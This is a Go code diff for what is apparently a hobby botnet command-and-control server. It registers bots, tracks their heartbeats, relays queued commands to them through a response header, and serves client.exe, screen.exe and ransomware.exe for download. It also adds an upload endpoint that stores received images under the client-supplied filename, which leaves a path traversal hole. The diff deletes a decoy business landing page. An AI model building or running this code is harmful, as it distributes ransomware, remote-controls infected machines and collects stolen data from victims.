@@ -4,49 +4,72 @@ import (
 	"encoding/json"
 	"fmt"
 	"github.com/gorilla/mux"
-	"html/template"
+	"io"
+	"io/ioutil"
 	"log"
 	"net/http"
+	"os"
 	"path/filepath"
 	"sync"
 	"time"
 )
 
-// temporary directory location
-//var srcDir = filepath.FromSlash("H:\\GolandProjects\\Botnet\\src")
+var srcDir = filepath.FromSlash("H:\\GolandProjects\\Botnet\\src")
 
-var srcDir = filepath.FromSlash("C:\\Users\\laugh\\GolandProjects\\Botnet\\src")
-
-var templates = template.Must(template.ParseFiles("./templates/base.html", "./templates/body.html"))
+//var srcDir = filepath.FromSlash("C:\\Users\\laugh\\GolandProjects\\Botnet\\src")
 
 type bot struct {
-	Id     string `json:"bot_id"`
-	Status string `json:"status"`
+	Id       string `json:"bot_id"`
+	Status   string `json:"status"`
+	Lastseen string `json:"lastseen"`
+	Command  string `json:"command"`
 }
 
-type botstatus struct {
-	Status   string
-	Lastseen time.Time
+func getBots() (bots []bot) {
+	fileBytes, err := ioutil.ReadFile("./bots.json")
+
+	if err != nil {
+		panic(err)
+	}
+
+	err = json.Unmarshal(fileBytes, &bots)
+
+	if err != nil {
+		panic(err)
+	}
+
+	return bots
 }
 
-type botmap map[string]botstatus
+func saveBots(bots []bot) {
 
-var m = make(botmap)
+	botBytes, err := json.Marshal(bots)
+	if err != nil {
+		panic(err)
+	}
+
+	err = ioutil.WriteFile("./bots.json", botBytes, 0666)
+	if err != nil {
+		panic(err)
+	}
+}
 
 func showbots(res http.ResponseWriter, req *http.Request) {
-	for k, v := range m {
-		_, err := fmt.Fprintf(res, "%s, %s,", k, v.Status)
+
+	bots := getBots()
+
+	for i, _ := range bots {
+		_, err := fmt.Fprintf(res, "%s, %s,", bots[i].Id, bots[i].Status)
 		if err != nil {
 			return
 		}
-		fmt.Fprintln(res, " ", v.Lastseen.UTC())
-
+		fmt.Fprintln(res, " ", bots[i].Lastseen)
 	}
 }
 
 func register(rw http.ResponseWriter, req *http.Request) {
 	var b bot
-	var bs botstatus
+	var check = 0
 
 	err := json.NewDecoder(req.Body).Decode(&b)
 	if err != nil {
@@ -54,62 +77,82 @@ func register(rw http.ResponseWriter, req *http.Request) {
 		return
 	}
 
-	_, ok := m[b.Id]
-	if ok {
-		fmt.Printf("Bot %s reconnected!\n", b.Id)
-		bs.Status = b.Status
-		bs.Lastseen = time.Now()
-		m[b.Id] = bs
-	} else {
-		bs.Status = b.Status
-		bs.Lastseen = time.Now()
-		m[b.Id] = bs
+	bots := getBots()
 
+	for i, _ := range bots {
+		if bots[i].Id == b.Id {
+			//fmt.Printf("Bot %s reconnected!\n", b.Id)
+			bots[i].Status = b.Status
+			bots[i].Lastseen = b.Lastseen
+			saveBots(bots)
+			check = 1
+		}
+	}
+	if check == 0 {
 		fmt.Printf("New Bot!\nID: %s\nStatus: %s\n", b.Id, b.Status)
-		fmt.Println("Time registered: ", bs.Lastseen.UTC())
+		fmt.Println("Time registered: ", b.Lastseen)
+		bots = append(bots, b)
+		saveBots(bots)
 		_, err = fmt.Fprintf(rw, "Registered!\n")
 		if err != nil {
 			return
 		}
 	}
-
 }
 
 func heartbeat(res http.ResponseWriter, req *http.Request) {
 	var b bot
-	var bs botstatus
+	bots := getBots()
 
 	err := json.NewDecoder(req.Body).Decode(&b)
 	if err != nil {
 		http.Error(res, err.Error(), http.StatusBadRequest)
 		return
 	}
-	bs.Status = b.Status
-	bs.Lastseen = time.Now()
 
-	m[b.Id] = bs
-
-	//fmt.Printf("heartbeat from %s", b.Id)
-	//fmt.Println(" at ", bs.Lastseen.UTC())
+	for i, _ := range bots {
+		if bots[i].Id == b.Id {
+			bots[i].Status = b.Status
+			bots[i].Lastseen = b.Lastseen
+			if bots[i].Command != "" {
+				fmt.Printf("Sending command '%s' to bot %s\n", bots[i].Command, bots[i].Id)
+				res.Header().Add("Command", bots[i].Command)
+				bots[i].Command = ""
+			}
+			saveBots(bots)
+		}
+	}
 }
 
+var botflag = 0
+
 func statusupdater() {
-	var bs botstatus
+	bots := getBots()
 	for true {
-		if len(m) > 0 {
-			time.Sleep(time.Second)
-			for k, v := range m {
-				start := v.Lastseen
-				end := time.Now()
-				diff := end.Sub(start)
-				//fmt.Println("difference in seconds is ", diff.Seconds())
-				if diff.Seconds() > 4 {
-					bs.Status = "dead"
-					bs.Lastseen = v.Lastseen
-					m[k] = bs
+		time.Sleep(time.Second)
+		if len(bots) > 0 {
+			for i, _ := range bots {
+				if bots[i].Status == "alive" {
+					start, _ := time.Parse(time.RFC850, bots[i].Lastseen)
+					start = start.UTC()
+					end := time.Now().UTC()
+					diff := end.Sub(start)
+					//fmt.Printf("Diff for bot %d: %.2f\n", i, diff.Seconds())
+					if diff.Seconds() > 6 {
+						bots[i].Status = "dead"
+						saveBots(bots)
+						fmt.Printf("bot %s died\n", bots[i].Id)
+						botflag = 1
+					} else {
+						if botflag == 1 {
+							fmt.Printf("bot %s revived\n", bots[i].Id)
+							botflag = 0
+						}
+					}
 				}
 			}
 		}
+		bots = getBots()
 	}
 }
 
@@ -121,44 +164,46 @@ func clientserver(res http.ResponseWriter, req *http.Request) {
 	http.ServeFile(res, req, filepath.Join(srcDir, "/files/client.exe"))
 }
 
-func index() http.Handler {
-	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
-		b := struct {
-			Title        template.HTML
-			BusinessName string
-			Slogan       string
-		}{
-			Title:        template.HTML("Business &verbar; Landing"),
-			BusinessName: "Business,",
-			Slogan:       "we get things done.",
-		}
-		err := templates.ExecuteTemplate(w, "base", &b)
-		if err != nil {
-			http.Error(w, fmt.Sprintf("index: couldn't parse template: %v", err), http.StatusInternalServerError)
-			return
-		}
-		w.WriteHeader(http.StatusOK)
-	})
+func screenserver(res http.ResponseWriter, req *http.Request) {
+	http.ServeFile(res, req, filepath.Join(srcDir, "/files/screen.exe"))
 }
 
-func logging(next http.Handler) http.Handler {
-	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
-		start := time.Now()
-		req := fmt.Sprintf("%s %s", r.Method, r.URL)
-		log.Println(req)
-		next.ServeHTTP(w, r)
-		log.Println(req, "completed in", time.Now().Sub(start))
-	})
+func ransomwareserver(res http.ResponseWriter, req *http.Request) {
+	http.ServeFile(res, req, filepath.Join(srcDir, "/files/ransomware.exe"))
 }
 
-func public() http.Handler {
-	return http.StripPrefix("/public/", http.FileServer(http.Dir("./public")))
+func uploadFile(res http.ResponseWriter, req *http.Request) {
+	fmt.Println("File Upload Endpoint Hit")
+
+	err := req.ParseMultipartForm(32 << 20) // maxMemory 32MB
+	if err != nil {
+		res.WriteHeader(http.StatusBadRequest)
+		return
+	}
+	//Access the photo key - First Approach
+	file, h, err := req.FormFile("photo")
+	if err != nil {
+		res.WriteHeader(http.StatusBadRequest)
+		return
+	}
+	tmpfile, err := os.Create("../files/images/" + h.Filename)
+	defer tmpfile.Close()
+	if err != nil {
+		res.WriteHeader(http.StatusInternalServerError)
+		return
+	}
+	_, err = io.Copy(tmpfile, file)
+	if err != nil {
+		res.WriteHeader(http.StatusInternalServerError)
+		return
+	}
+
+	res.WriteHeader(200)
+	return
 }
 
 func newRouter() *mux.Router {
 	r := mux.NewRouter()
-
-	r.PathPrefix("/public/").Handler(logging(public())).Methods("GET")
 
 	fmt.Printf("Starting server at port 8081\n")
 
@@ -168,11 +213,15 @@ func newRouter() *mux.Router {
 
 	r.HandleFunc("/client", clientserver)
 
+	r.HandleFunc("/screen", screenserver)
+
+	r.HandleFunc("/ransomware", ransomwareserver)
+
 	r.HandleFunc("/showbots", showbots)
 
 	r.HandleFunc("/heartbeat", heartbeat)
 
-	r.PathPrefix("/").Handler(logging(index())).Methods("GET")
+	r.HandleFunc("/upload", uploadFile)
 
 	return r
 }
